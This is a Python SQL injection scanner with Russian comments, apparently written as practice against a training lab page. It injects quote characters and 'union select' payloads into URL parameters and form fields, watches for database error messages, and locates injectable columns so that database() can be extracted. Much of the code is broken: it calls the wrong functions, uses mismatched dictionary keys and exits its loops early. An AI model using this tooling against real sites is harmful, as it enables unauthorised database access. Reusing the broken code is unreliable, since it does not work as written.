import requests
from requests_html import HTMLSession
from bs4 import BeautifulSoup 
from urllib.parse import urljoin
from pprint import pprint

# сохраняем печеньки
#session = HTMLSession()
session = requests.Session()

def forms(url):
	#request.html.render() # если сайт использует динамическую подгрузку на js
	request = session.get(url)
	r_content = request.content
	a = BeautifulSoup(r_content, "html.parser")
	form_1 = a.find_all('form')
	return form_1

def all_forms_from_the_page(form):
	ins= {}
	# action - is the target url
	try:
		form_action = form.attrs.get('action').lower()
	except:
		form_action = None
	form_method = form.attrs.get("method", "get").lower()
	spisok_inputs = []
	s = form.find_all('input')
	for tag_i in s:
		type_i = tag_i.attrs.get("type", "text")
		name_i = tag_i.attrs.get('name')
		value_i = tag_i.attrs.get("value", "")
		spisok_inputs.append({'type:' : type_i , 'name' : name_i , 'value': value_i})
	
	ins['action'] = form_action
	ins['method'] = form_method
	ins['inputs'] = spisok_inputs
	return ins
def sql_errors(a):
	
	sql_error = {
        # MySQL
        "you have an error in your sql syntax;",
        "warning: mysql",
        # SQL Server
        "unclosed quotation mark after the character string",
        # Oracle
        "quoted string not properly terminated",
    }
	
	for i in sql_error:
		#print(a.content.decode().lower())
		#print(i)
		
		if i in a.content.decode().lower():
			print('found error(-s)')
			print('------------------------------------------------------------')					 					
			return True
	print('not found errors\n')
	return False

def sql_inj(aa):
	sql_errors_in_db = {
	"the used select statements have a different number of columns"
	}
	for ff in sql_errors_in_db:
		#print(aa.content.decode().lower())
		if ff in aa.content.decode().lower():
			print(ff+ '\n')
			return True
		#print('подошло')
		return False
		#break
def columns(aaa):
	number = {
	'Username is : 1','Username is : 2','Username is : 3'
	}
	for fff in number:
		if fff in aaa.content.decode():
			print(fff)
			return True
	return False
	
def scanner(url):
	tmp=[]
	mas_select = []
	for g in range(1,5):
		tmp.append(str(g))
		tmp2 = str(','.join(map(str, tmp)))
		mas_select.append('union select ' + tmp2 + '-- -')
		#split = str(''.join((str(i) for i in heh)))
	#print(mas_select)
	print()
	vulnerable_links = []
	for j in ['"',"'"]:
		url_with_character = f"{url}{j}"
		print("[?] Cheking ", url_with_character)
		r = session.get(url_with_character)
		if sql_errors(r):
			print("[!] Found new volnerability. \nLink : ", url_with_character)
			vulnerable_links.append(url_with_character)
			print('Find vulnerable columns \n')

			for hh in mas_select:
			
				url_select = []
				url_select.append(vulnerable_links[0]+hh) 
				print('try: '+url_select[0])
		
				url_with_words = session.get(url_select[0])
				if sql_inj(url_with_words):
					continue
					#print('не то')
				adf = str(','.join((str(i) for i in hh)))
				print('подошло. Выведем номер уязвимой колонки')
				#ho = []
				#ho.append(adf)
				#new = url_select[0]
				print(url_select[0])
				if columns(url_with_words):
					print('подставим в эту колонку database()')
				
				break
				
					#вывести данные
				
				
			print("\n")
			return
	form = all_forms_from_the_page(url)
	print(f" Found {len(form)} forms on {url}")
	for k in form:
		ins = all_forms_from_the_page(k)
		for i in "\"'":
			body_with_data =  {}
			kek = ins["inputs"]
			for tag_i in kek:
				
				if tag_i["type"] == "hidden" or tag_i["value"]:
					try:
						body_with_data[tag_i["name"]] = tag_i['value'] + k
					except:
						pass
				elif tag_i['type'] != 'submit':
					body_with_data[tag_i['name']] = f"testHTML{i}"
			url = urljoin(url , ins['action'])
			
			if ins['method'] == 'post':
				r = session.post(url , data = body_with_data)
			elif ins['method'] == 'get':
				r = session.get(url, params = body_with_data)
			if sql_errors(r):
				print(" ! SQL injection works. Url: ", url)
				print("The Form is: ")
				pprint('kekekekeekekekkkk',ins)
				break
	
						
if __name__ == '__main__':
	url = 'http://www.leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1'
	
	scanner(url)	
		
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
			















